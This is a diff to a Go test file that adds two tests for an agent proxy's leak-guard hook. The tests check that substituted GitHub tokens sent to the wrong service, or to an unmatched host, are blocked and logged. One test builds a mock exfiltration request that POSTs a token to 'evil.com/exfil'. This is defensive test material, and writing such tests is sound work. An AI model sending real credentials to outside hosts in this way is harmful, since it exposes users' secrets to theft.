@@ -7,6 +7,7 @@ import (
 	"log/slog"
 	"net/http"
 	"net/http/httptest"
+	"strings"
 	"testing"
 
 	"github.com/agentsh/agentsh/internal/proxy/credsub"
@@ -536,6 +537,81 @@ func TestCredsSubHook_PostHook_NilScrubMap_ScrubsAll(t *testing.T) {
 	got, _ := io.ReadAll(resp.Body)
 	if bytes.Contains(got, []byte("ghp_REAL1234567890abcdef")) {
 		t.Error("expected real credential to be scrubbed (nil map = scrub all)")
+	}
+}
+
+func TestLeakGuardHook_CrossServiceUse_LogsDifferentEvent(t *testing.T) {
+	table := credsub.New()
+	fakeA := []byte("ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+	realA := []byte("ghp_RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR")
+	if err := table.Add("github", fakeA, realA); err != nil {
+		t.Fatal(err)
+	}
+
+	var buf bytes.Buffer
+	logger := slog.New(slog.NewJSONHandler(&buf, nil))
+	hook := NewLeakGuardHook(table, logger)
+
+	body := []byte(`{"token":"` + string(fakeA) + `"}`)
+	req := httptest.NewRequest("POST", "http://proxy/svc/stripe/v1/charges", bytes.NewReader(body))
+	ctx := &RequestContext{
+		SessionID:   "sess-1",
+		RequestID:   "req-1",
+		ServiceName: "stripe",
+	}
+
+	err := hook.PreHook(req, ctx)
+	if err == nil {
+		t.Fatal("expected error for cross-service credential use")
+	}
+	var abort *HookAbortError
+	if !errors.As(err, &abort) || abort.StatusCode != 403 {
+		t.Fatalf("want 403 HookAbortError, got %v", err)
+	}
+
+	logOutput := buf.String()
+	if !strings.Contains(logOutput, "secret_cross_service_use") {
+		t.Errorf("want secret_cross_service_use in log, got:\n%s", logOutput)
+	}
+	if !strings.Contains(logOutput, `"source_service":"github"`) {
+		t.Errorf("want source_service=github in log, got:\n%s", logOutput)
+	}
+	if !strings.Contains(logOutput, `"target_service":"stripe"`) {
+		t.Errorf("want target_service=stripe in log, got:\n%s", logOutput)
+	}
+}
+
+func TestLeakGuardHook_UnmatchedHost_LogsLeakBlocked(t *testing.T) {
+	table := credsub.New()
+	fake := []byte("ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+	real := []byte("ghp_RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR")
+	if err := table.Add("github", fake, real); err != nil {
+		t.Fatal(err)
+	}
+
+	var buf bytes.Buffer
+	logger := slog.New(slog.NewJSONHandler(&buf, nil))
+	hook := NewLeakGuardHook(table, logger)
+
+	body := []byte(`{"token":"` + string(fake) + `"}`)
+	req := httptest.NewRequest("POST", "http://evil.com/exfil", bytes.NewReader(body))
+	ctx := &RequestContext{
+		SessionID:   "sess-1",
+		RequestID:   "req-1",
+		ServiceName: "",
+	}
+
+	err := hook.PreHook(req, ctx)
+	if err == nil {
+		t.Fatal("expected error for leak to unmatched host")
+	}
+
+	logOutput := buf.String()
+	if !strings.Contains(logOutput, "secret_leak_blocked") {
+		t.Errorf("want secret_leak_blocked in log, got:\n%s", logOutput)
+	}
+	if strings.Contains(logOutput, "secret_cross_service_use") {
+		t.Error("unmatched host should log secret_leak_blocked, not secret_cross_service_use")
 	}
 }
 
